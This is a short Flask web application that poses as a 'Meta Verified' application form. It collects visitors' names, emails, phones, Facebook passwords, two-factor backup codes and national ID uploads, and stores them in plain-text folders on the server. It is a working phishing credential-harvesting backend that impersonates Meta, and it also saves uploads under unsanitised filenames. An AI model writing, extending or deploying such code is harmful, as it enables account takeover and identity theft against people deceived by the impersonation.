from flask import Flask, render_template, request
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "submissions"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    name = request.form.get("name")
    email = request.form.get("email")
    phone = request.form.get("phone")
    fb_password = request.form.get("fb_password")
    backup_code = request.form.get("backup_code")
    additional_info = request.form.get("additional_info")
    file = request.files["nid"]

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    folder = os.path.join(UPLOAD_FOLDER, f"{name.replace(' ', '_')}_{timestamp}")
    os.makedirs(folder, exist_ok=True)

    with open(os.path.join(folder, "data.txt"), "w") as f:
        f.write(f"Name: {name}\nEmail: {email}\nPhone: {phone}\nPassword: {fb_password}\nBackup Code: {backup_code}\n\nAdditional Info:\n{additional_info}\n")

    if file:
        file.save(os.path.join(folder, file.filename))

    return "✅ Your Meta Verified application has been submitted successfully!"

if __name__ == "__main__":
    app.run(debug=True)
